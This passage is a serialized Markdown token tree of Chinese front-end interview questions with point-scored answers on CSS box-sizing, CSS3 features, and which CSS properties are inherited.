类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** content-box（默认值）：width 和 height 只包括内容区域，不包括 padding 和 border。\\n- **1：** border-box：width 和 height 包括内容区域、padding 和 border。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** content-box（默认值）：width 和 height 只包括内容区域，不包括 padding 和 border。\\n","task":false,"loose":false,"text":"**1：** content-box（默认值）：width 和 height 只包括内容区域，不包括 padding 和 border。","tokens":[{"type":"text","raw":"**1：** content-box（默认值）：width 和 height 只包括内容区域，不包括 padding 和 border。","text":"**1：** content-box（默认值）：width 和 height 只包括内容区域，不包括 padding 和 border。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" content-box（默认值）：width 和 height 只包括内容区域，不包括 padding 和 border。","text":" content-box（默认值）：width 和 height 只包括内容区域，不包括 padding 和 border。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** border-box：width 和 height 包括内容区域、padding 和 border。","task":false,"loose":false,"text":"**1：** border-box：width 和 height 包括内容区域、padding 和 border。","tokens":[{"type":"text","raw":"**1：** border-box：width 和 height 包括内容区域、padding 和 border。","text":"**1：** border-box：width 和 height 包括内容区域、padding 和 border。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" border-box：width 和 height 包括内容区域、padding 和 border。","text":" border-box：width 和 height 包括内容区域、padding 和 border。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## CSS3有哪些重要的新特性？\\n\\n","depth":2,"text":"CSS3有哪些重要的新特性？","tokens":[{"type":"text","raw":"CSS3有哪些重要的新特性？","text":"CSS3有哪些重要的新特性？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** 选择器和伪类：\\n  + 属性选择器增强\\n  + 新增伪类：:nth-child()、:first-of-type等\\n  + 伪元素使用双冒号::before\\n\\n- **1：** 视觉效果：\\n  + 圆角(border-radius)\\n  + 阴影(text-shadow/box-shadow)\\n  + 渐变(linear-gradient/radial-gradient)\\n  + RGBA和HSLA颜色\\n  + 不透明度(opacity)\\n\\n- **1：** 转换和动画：\\n  + 2D/3D转换(transform)\\n  + 过渡效果(transition)\\n  + 动画效果(animation/@keyframes)\\n\\n- **1：** 布局能力：\\n  + 弹性布局(display: flex)\\n  + 网格布局(display: grid)\\n  + 多列布局(column-count)\\n  + 盒模型调整(box-sizing)\\n\\n- **1：** 响应式设计：\\n  + 媒体查询(@media)\\n  + 视口单位(vh/vw)\\n  + 图像适配(object-fit)\\n  + 自定义属性(变量)","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 选择器和伪类：\\n  + 属性选择器增强\\n  + 新增伪类：:nth-child()、:first-of-type等\\n  + 伪元素使用双冒号::before\\n\\n","task":false,"loose":true,"text":"**1：** 选择器和伪类：\\n+ 属性选择器增强\\n+ 新增伪类：:nth-child()、:first-of-type等\\n+ 伪元素使用双冒号::before\\n","tokens":[{"type":"text","raw":"**1：** 选择器和伪类：\\n","text":"**1：** 选择器和伪类：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 选择器和伪类：","text":" 选择器和伪类：","escaped":false}]},{"type":"list","raw":"+ 属性选择器增强\\n+ 新增伪类：:nth-child()、:first-of-type等\\n+ 伪元素使用双冒号::before\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 属性选择器增强\\n","task":false,"loose":false,"text":"属性选择器增强","tokens":[{"type":"text","raw":"属性选择器增强","text":"属性选择器增强","tokens":[{"type":"text","raw":"属性选择器增强","text":"属性选择器增强","escaped":false}]}]},{"type":"list_item","raw":"+ 新增伪类：:nth-child()、:first-of-type等\\n","task":false,"loose":false,"text":"新增伪类：:nth-child()、:first-of-type等","tokens":[{"type":"text","raw":"新增伪类：:nth-child()、:first-of-type等","text":"新增伪类：:nth-child()、:first-of-type等","tokens":[{"type":"text","raw":"新增伪类：:nth-child()、:first-of-type等","text":"新增伪类：:nth-child()、:first-of-type等","escaped":false}]}]},{"type":"list_item","raw":"+ 伪元素使用双冒号::before","task":false,"loose":false,"text":"伪元素使用双冒号::before","tokens":[{"type":"text","raw":"伪元素使用双冒号::before","text":"伪元素使用双冒号::before","tokens":[{"type":"text","raw":"伪元素使用双冒号::before","text":"伪元素使用双冒号::before","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 视觉效果：\\n  + 圆角(border-radius)\\n  + 阴影(text-shadow/box-shadow)\\n  + 渐变(linear-gradient/radial-gradient)\\n  + RGBA和HSLA颜色\\n  + 不透明度(opacity)\\n\\n","task":false,"loose":true,"text":"**1：** 视觉效果：\\n+ 圆角(border-radius)\\n+ 阴影(text-shadow/box-shadow)\\n+ 渐变(linear-gradient/radial-gradient)\\n+ RGBA和HSLA颜色\\n+ 不透明度(opacity)\\n","tokens":[{"type":"text","raw":"**1：** 视觉效果：\\n","text":"**1：** 视觉效果：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 视觉效果：","text":" 视觉效果：","escaped":false}]},{"type":"list","raw":"+ 圆角(border-radius)\\n+ 阴影(text-shadow/box-shadow)\\n+ 渐变(linear-gradient/radial-gradient)\\n+ RGBA和HSLA颜色\\n+ 不透明度(opacity)\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 圆角(border-radius)\\n","task":false,"loose":false,"text":"圆角(border-radius)","tokens":[{"type":"text","raw":"圆角(border-radius)","text":"圆角(border-radius)","tokens":[{"type":"text","raw":"圆角(border-radius)","text":"圆角(border-radius)","escaped":false}]}]},{"type":"list_item","raw":"+ 阴影(text-shadow/box-shadow)\\n","task":false,"loose":false,"text":"阴影(text-shadow/box-shadow)","tokens":[{"type":"text","raw":"阴影(text-shadow/box-shadow)","text":"阴影(text-shadow/box-shadow)","tokens":[{"type":"text","raw":"阴影(text-shadow/box-shadow)","text":"阴影(text-shadow/box-shadow)","escaped":false}]}]},{"type":"list_item","raw":"+ 渐变(linear-gradient/radial-gradient)\\n","task":false,"loose":false,"text":"渐变(linear-gradient/radial-gradient)","tokens":[{"type":"text","raw":"渐变(linear-gradient/radial-gradient)","text":"渐变(linear-gradient/radial-gradient)","tokens":[{"type":"text","raw":"渐变(linear-gradient/radial-gradient)","text":"渐变(linear-gradient/radial-gradient)","escaped":false}]}]},{"type":"list_item","raw":"+ RGBA和HSLA颜色\\n","task":false,"loose":false,"text":"RGBA和HSLA颜色","tokens":[{"type":"text","raw":"RGBA和HSLA颜色","text":"RGBA和HSLA颜色","tokens":[{"type":"text","raw":"RGBA和HSLA颜色","text":"RGBA和HSLA颜色","escaped":false}]}]},{"type":"list_item","raw":"+ 不透明度(opacity)","task":false,"loose":false,"text":"不透明度(opacity)","tokens":[{"type":"text","raw":"不透明度(opacity)","text":"不透明度(opacity)","tokens":[{"type":"text","raw":"不透明度(opacity)","text":"不透明度(opacity)","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 转换和动画：\\n  + 2D/3D转换(transform)\\n  + 过渡效果(transition)\\n  + 动画效果(animation/@keyframes)\\n\\n","task":false,"loose":true,"text":"**1：** 转换和动画：\\n+ 2D/3D转换(transform)\\n+ 过渡效果(transition)\\n+ 动画效果(animation/@keyframes)\\n","tokens":[{"type":"text","raw":"**1：** 转换和动画：\\n","text":"**1：** 转换和动画：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 转换和动画：","text":" 转换和动画：","escaped":false}]},{"type":"list","raw":"+ 2D/3D转换(transform)\\n+ 过渡效果(transition)\\n+ 动画效果(animation/@keyframes)\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 2D/3D转换(transform)\\n","task":false,"loose":false,"text":"2D/3D转换(transform)","tokens":[{"type":"text","raw":"2D/3D转换(transform)","text":"2D/3D转换(transform)","tokens":[{"type":"text","raw":"2D/3D转换(transform)","text":"2D/3D转换(transform)","escaped":false}]}]},{"type":"list_item","raw":"+ 过渡效果(transition)\\n","task":false,"loose":false,"text":"过渡效果(transition)","tokens":[{"type":"text","raw":"过渡效果(transition)","text":"过渡效果(transition)","tokens":[{"type":"text","raw":"过渡效果(transition)","text":"过渡效果(transition)","escaped":false}]}]},{"type":"list_item","raw":"+ 动画效果(animation/@keyframes)","task":false,"loose":false,"text":"动画效果(animation/@keyframes)","tokens":[{"type":"text","raw":"动画效果(animation/@keyframes)","text":"动画效果(animation/@keyframes)","tokens":[{"type":"text","raw":"动画效果(animation/@keyframes)","text":"动画效果(animation/@keyframes)","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 布局能力：\\n  + 弹性布局(display: flex)\\n  + 网格布局(display: grid)\\n  + 多列布局(column-count)\\n  + 盒模型调整(box-sizing)\\n\\n","task":false,"loose":true,"text":"**1：** 布局能力：\\n+ 弹性布局(display: flex)\\n+ 网格布局(display: grid)\\n+ 多列布局(column-count)\\n+ 盒模型调整(box-sizing)\\n","tokens":[{"type":"text","raw":"**1：** 布局能力：\\n","text":"**1：** 布局能力：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 布局能力：","text":" 布局能力：","escaped":false}]},{"type":"list","raw":"+ 弹性布局(display: flex)\\n+ 网格布局(display: grid)\\n+ 多列布局(column-count)\\n+ 盒模型调整(box-sizing)\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 弹性布局(display: flex)\\n","task":false,"loose":false,"text":"弹性布局(display: flex)","tokens":[{"type":"text","raw":"弹性布局(display: flex)","text":"弹性布局(display: flex)","tokens":[{"type":"text","raw":"弹性布局(display: flex)","text":"弹性布局(display: flex)","escaped":false}]}]},{"type":"list_item","raw":"+ 网格布局(display: grid)\\n","task":false,"loose":false,"text":"网格布局(display: grid)","tokens":[{"type":"text","raw":"网格布局(display: grid)","text":"网格布局(display: grid)","tokens":[{"type":"text","raw":"网格布局(display: grid)","text":"网格布局(display: grid)","escaped":false}]}]},{"type":"list_item","raw":"+ 多列布局(column-count)\\n","task":false,"loose":false,"text":"多列布局(column-count)","tokens":[{"type":"text","raw":"多列布局(column-count)","text":"多列布局(column-count)","tokens":[{"type":"text","raw":"多列布局(column-count)","text":"多列布局(column-count)","escaped":false}]}]},{"type":"list_item","raw":"+ 盒模型调整(box-sizing)","task":false,"loose":false,"text":"盒模型调整(box-sizing)","tokens":[{"type":"text","raw":"盒模型调整(box-sizing)","text":"盒模型调整(box-sizing)","tokens":[{"type":"text","raw":"盒模型调整(box-sizing)","text":"盒模型调整(box-sizing)","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 响应式设计：\\n  + 媒体查询(@media)\\n  + 视口单位(vh/vw)\\n  + 图像适配(object-fit)\\n  + 自定义属性(变量)","task":false,"loose":true,"text":"**1：** 响应式设计：\\n+ 媒体查询(@media)\\n+ 视口单位(vh/vw)\\n+ 图像适配(object-fit)\\n+ 自定义属性(变量)","tokens":[{"type":"text","raw":"**1：** 响应式设计：\\n","text":"**1：** 响应式设计：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 响应式设计：","text":" 响应式设计：","escaped":false}]},{"type":"list","raw":"+ 媒体查询(@media)\\n+ 视口单位(vh/vw)\\n+ 图像适配(object-fit)\\n+ 自定义属性(变量)","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 媒体查询(@media)\\n","task":false,"loose":false,"text":"媒体查询(@media)","tokens":[{"type":"text","raw":"媒体查询(@media)","text":"媒体查询(@media)","tokens":[{"type":"text","raw":"媒体查询(@media)","text":"媒体查询(@media)","escaped":false}]}]},{"type":"list_item","raw":"+ 视口单位(vh/vw)\\n","task":false,"loose":false,"text":"视口单位(vh/vw)","tokens":[{"type":"text","raw":"视口单位(vh/vw)","text":"视口单位(vh/vw)","tokens":[{"type":"text","raw":"视口单位(vh/vw)","text":"视口单位(vh/vw)","escaped":false}]}]},{"type":"list_item","raw":"+ 图像适配(object-fit)\\n","task":false,"loose":false,"text":"图像适配(object-fit)","tokens":[{"type":"text","raw":"图像适配(object-fit)","text":"图像适配(object-fit)","tokens":[{"type":"text","raw":"图像适配(object-fit)","text":"图像适配(object-fit)","escaped":false}]}]},{"type":"list_item","raw":"+ 自定义属性(变量)","task":false,"loose":false,"text":"自定义属性(变量)","tokens":[{"type":"text","raw":"自定义属性(变量)","text":"自定义属性(变量)","tokens":[{"type":"text","raw":"自定义属性(变量)","text":"自定义属性(变量)","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## CSS哪些属性可以继承\\n\\n","depth":2,"text":"CSS哪些属性可以继承","tokens":[{"type":"text","raw":"CSS哪些属性可以继承","text":"CSS哪些属性可以继承","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 不可继承的\\n\\n  + display\\n    指定元素的显示方式，常见的值包括：\\n    block：块级元素，占据整行\\n    inline：行内元素，只占据必要的宽度，不换行\\n    inline-block：结合了 inline 和 block 的特性\\n    none：隐藏元素\\n\\n  + margin\\n    设置元素外部的空白区域，即元素与其他元素之间的距离\\n\\n  + border\\n    设置元素的边框可以指定边框的宽度、样式和颜色\\n\\n  + padding\\n    设置元素内容与边框之间的内边距，控制元素内部的空白区域\\n\\n  + background\\n    设置元素的背景，包括背景颜色、背景图像等\\n\\n  + height\\n    指定元素的高度\\n\\n  + min-height\\n    设置元素的最小高度，元素的高度不能小于此值\\n\\n  + max-height\\n    设置元素的最大高度，元素的高度不能超过此值\\n\\n  + width\\n    指定元素的宽度\\n\\n  + min-width\\n    设置元素的最小宽度，元素的宽度不能小于此值\\n\\n  + max-width\\n    设置元素的最大宽度，元素的宽度不能超过此值\\n\\n  + overflow\\n    控制当内容溢出元素的边界时如何显示常见的值：\\n      visible：内容溢出时可见\\n      hidden：内容溢出时隐藏\\n      scroll：出现滚动条\\n      auto：根据需要自动显示滚动条\\n\\n  + position\\n    设置元素的定位方式常见的值：\\n      static：默认值，元素按文档流排列\\n      relative：相对定位，元素相对于其原始位置偏移\\n      absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n      fixed：固定定位，元素相对于浏览器窗口定位\\n      sticky：粘性定位，元素在滚动到特定位置时变为固定定位\\n\\n  + top, bottom, left, right\\n    当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量\\n\\n  + z-index\\n    控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效\\n\\n  + float\\n    指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n      left：元素向左浮动\\n      right：元素向右浮动\\n      none：取消浮动\\n\\n  + clear\\n    控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n      left：禁止元素左侧有浮动元素\\n      right：禁止元素右侧有浮动元素\\n      both：禁止元素两侧有浮动元素\\n      none：允许两侧都有浮动元素\\n\\n  + table-layout\\n    控制表格布局的算法常见的值：\\n      auto：浏览器根据内容调整列宽（默认）\\n      fixed：浏览器根据表格的宽度固定列宽\\n\\n  + vertical-align\\n    控制元素在垂直方向上的对齐方式常见的值：\\n      top：元素顶部对齐\\n      middle：元素垂直居中对齐\\n      bottom：元素底部对齐\\n\\n  + page-break-after\\n    控制分页符的位置常见的值：\\n      auto：默认，自动决定分页\\n      always：强制分页\\n      avoid：避免分页\\n\\n  + page-break-before\\n    与 page-break-after 类似，控制元素前面的分页符\\n\\n  + unicode-bidi\\n    控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n      normal：正常的双向文本布局\\n      embed：强制嵌入的文本遵循本地的方向性\\n      bidi-override：覆盖文本的方向性，强制使用 direction 属性的值\\n\\n- **1：** 所有元素可继承的\\n\\n  + visibility\\n    visibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n    常见值包括：\\n      visible（默认值）：元素是可见的\\n      hidden：元素不可见，但仍然占据空间\\n      collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 `<tr>、<th>、<td>` 等表格元素）\\n\\n  + cursor\\n    cursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n    常见值包括：\\n      auto：默认指针，浏览器根据上下文决定指针样式\\n      pointer：显示手形指针，通常用于可点击的链接或按钮\\n      default：默认的光标样式\\n      none：隐藏鼠标指针\\n      wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n      move：显示一个四向箭头，表示可以移动元素\\n      text：显示文本光标，通常用于文本输入区域\\n      not-allowed：显示禁用的指针，通常表示该操作不可用\\n      help：显示问号光标，通常表示需要帮助的地方\\n\\n- **1：** 终极块级元素可继承的\\n\\n  + text-indent\\n    text-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 `<p>、<div>` 等，控制块内文本的缩进量；常见值：\\n      length：指定缩进的距离，例如 20px 或 2em\\n      %：表示缩进的百分比，基于元素的宽度\\n      initial：将属性恢复为默认值\\n\\n  + text-align\\n    text-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n      left：将文本对齐到左边\\n      right：将文本对齐到右边\\n      center：将文本居中\\n      justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n      start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式\\n\\n- **1：** 内联元素可继承的\\n  + letter-spacing\\n    letter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n      normal：默认的字符间距，通常为 0\\n      length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em\\n\\n  + word-spacing\\n    word-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n    常见值：\\n      normal：默认的单词间距。\\n      length：指定单词间距，可以使用 px、em、rem 等单位。\\n\\n  + white-space\\n    white-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n      normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n      nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n      pre：保留空格和换行符，类似于 `<pre>` 标签的效果\\n      pre-wrap：保留空格和换行符，文本会自动换行\\n      pre-line：合并多个空白字符，但保留换行符\\n\\n  + line-height\\n    line-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n      normal：默认的行高，通常为字体大小的 1.2 倍。\\n      number：指定行高为字体大小的倍数。\\n      length：指定固定的行高值，如 20px、1.5em。\\n      percentage：指定行高为字体大小的百分比。\\n\\n  + color\\n    color 用于设置文本的颜色，常见值：\\n      color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。\\n\\n  + font\\n\\n    font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n      font-style、font-variant、font-weight、font-size、line-height、font-family\\n  + font-size\\n    font-size 用于设置文本的大小；常见值：\\n      length：如 12px、1em、0.75rem。\\n      percentage：相对于父元素的字体大小，如 150%。\\n      medium：默认字体大小。\\n      larger / smaller：相对于父元素字体大小的大小调整。\\n\\n  + font-style\\n    font-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n      normal：正常样式\\n      italic：斜体\\n      oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形\\n\\n  + font-variant\\n    font-variant 用于控制文本是否使用变体字体；常见值：\\n      normal：正常字体。\\n      small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。\\n\\n  + font-weight\\n    font-weight 用于设置文本的粗细；常见值：\\n      normal：正常的字体粗细\\n      bold：加粗字体\\n      bolder：比父元素更粗\\n      lighter：比父元素更细\\n      number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗\\n\\n  + text-decoration\\n    text-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n      none：无装饰\\n      underline：下划线\\n      overline：上划线\\n      line-through：删除线\\n      blink：闪烁的文本（大多数浏览器已不支持）\\n\\n  + text-transform\\n    text-transform 用于控制文本的大小写转换；常见值：\\n      none：不转换大小写\\n      capitalize：将每个单词的首字母转换为大写\\n      uppercase：将所有字母转换为大写\\n      lowercase：将所有字母转换为小写\\n\\n  + direction\\n    direction 用于设置文本的书写方向；常见值：\\n      ltr：从左到右（默认）\\n      rtl：从右到左，通常用于阿拉伯语、希伯来语等语言\\n\\n- **1：** 列表元素可继承的属性\\n  + list-style\\n    list-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n      list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n      list-style-position：标记的位置，inside 或 outside。\\n      list-style-image：指定列表项标记为图片。\\n\\n  + list-style-type\\n    list-style-type 用于设置列表项的标记类型；常见值：\\n      disc：实心圆点（默认）\\n      circle：空心圆点\\n      square：方块\\n      decimal：数字列表（如 1, 2, 3）\\n      none：没有标记\\n\\n  + list-style-position\\n    list-style-position 用于设置列表标记的位置；常见值：\\n      outside：标记在列表项外部（默认）\\n      inside：标记在列表项内部\\n\\n  + list-style-image\\n    list-style-image 用于设置列表项标记为自定义图像；常见值：`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 不可继承的\\n\\n  + display\\n    指定元素的显示方式，常见的值包括：\\n    block：块级元素，占据整行\\n    inline：行内元素，只占据必要的宽度，不换行\\n    inline-block：结合了 inline 和 block 的特性\\n    none：隐藏元素\\n\\n  + margin\\n    设置元素外部的空白区域，即元素与其他元素之间的距离\\n\\n  + border\\n    设置元素的边框可以指定边框的宽度、样式和颜色\\n\\n  + padding\\n    设置元素内容与边框之间的内边距，控制元素内部的空白区域\\n\\n  + background\\n    设置元素的背景，包括背景颜色、背景图像等\\n\\n  + height\\n    指定元素的高度\\n\\n  + min-height\\n    设置元素的最小高度，元素的高度不能小于此值\\n\\n  + max-height\\n    设置元素的最大高度，元素的高度不能超过此值\\n\\n  + width\\n    指定元素的宽度\\n\\n  + min-width\\n    设置元素的最小宽度，元素的宽度不能小于此值\\n\\n  + max-width\\n    设置元素的最大宽度，元素的宽度不能超过此值\\n\\n  + overflow\\n    控制当内容溢出元素的边界时如何显示常见的值：\\n      visible：内容溢出时可见\\n      hidden：内容溢出时隐藏\\n      scroll：出现滚动条\\n      auto：根据需要自动显示滚动条\\n\\n  + position\\n    设置元素的定位方式常见的值：\\n      static：默认值，元素按文档流排列\\n      relative：相对定位，元素相对于其原始位置偏移\\n      absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n      fixed：固定定位，元素相对于浏览器窗口定位\\n      sticky：粘性定位，元素在滚动到特定位置时变为固定定位\\n\\n  + top, bottom, left, right\\n    当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量\\n\\n  + z-index\\n    控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效\\n\\n  + float\\n    指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n      left：元素向左浮动\\n      right：元素向右浮动\\n      none：取消浮动\\n\\n  + clear\\n    控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n      left：禁止元素左侧有浮动元素\\n      right：禁止元素右侧有浮动元素\\n      both：禁止元素两侧有浮动元素\\n      none：允许两侧都有浮动元素\\n\\n  + table-layout\\n    控制表格布局的算法常见的值：\\n      auto：浏览器根据内容调整列宽（默认）\\n      fixed：浏览器根据表格的宽度固定列宽\\n\\n  + vertical-align\\n    控制元素在垂直方向上的对齐方式常见的值：\\n      top：元素顶部对齐\\n      middle：元素垂直居中对齐\\n      bottom：元素底部对齐\\n\\n  + page-break-after\\n    控制分页符的位置常见的值：\\n      auto：默认，自动决定分页\\n      always：强制分页\\n      avoid：避免分页\\n\\n  + page-break-before\\n    与 page-break-after 类似，控制元素前面的分页符\\n\\n  + unicode-bidi\\n    控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n      normal：正常的双向文本布局\\n      embed：强制嵌入的文本遵循本地的方向性\\n      bidi-override：覆盖文本的方向性，强制使用 direction 属性的值\\n\\n","task":false,"loose":true,"text":"**1：** 不可继承的\\n\\n+ display\\n  指定元素的显示方式，常见的值包括：\\n  block：块级元素，占据整行\\n  inline：行内元素，只占据必要的宽度，不换行\\n  inline-block：结合了 inline 和 block 的特性\\n  none：隐藏元素\\n\\n+ margin\\n  设置元素外部的空白区域，即元素与其他元素之间的距离\\n\\n+ border\\n  设置元素的边框可以指定边框的宽度、样式和颜色\\n\\n+ padding\\n  设置元素内容与边框之间的内边距，控制元素内部的空白区域\\n\\n+ background\\n  设置元素的背景，包括背景颜色、背景图像等\\n\\n+ height\\n  指定元素的高度\\n\\n+ min-height\\n  设置元素的最小高度，元素的高度不能小于此值\\n\\n+ max-height\\n  设置元素的最大高度，元素的高度不能超过此值\\n\\n+ width\\n  指定元素的宽度\\n\\n+ min-width\\n  设置元素的最小宽度，元素的宽度不能小于此值\\n\\n+ max-width\\n  设置元素的最大宽度，元素的宽度不能超过此值\\n\\n+ overflow\\n  控制当内容溢出元素的边界时如何显示常见的值：\\n    visible：内容溢出时可见\\n    hidden：内容溢出时隐藏\\n    scroll：出现滚动条\\n    auto：根据需要自动显示滚动条\\n\\n+ position\\n  设置元素的定位方式常见的值：\\n    static：默认值，元素按文档流排列\\n    relative：相对定位，元素相对于其原始位置偏移\\n    absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n    fixed：固定定位，元素相对于浏览器窗口定位\\n    sticky：粘性定位，元素在滚动到特定位置时变为固定定位\\n\\n+ top, bottom, left, right\\n  当元素使用 position 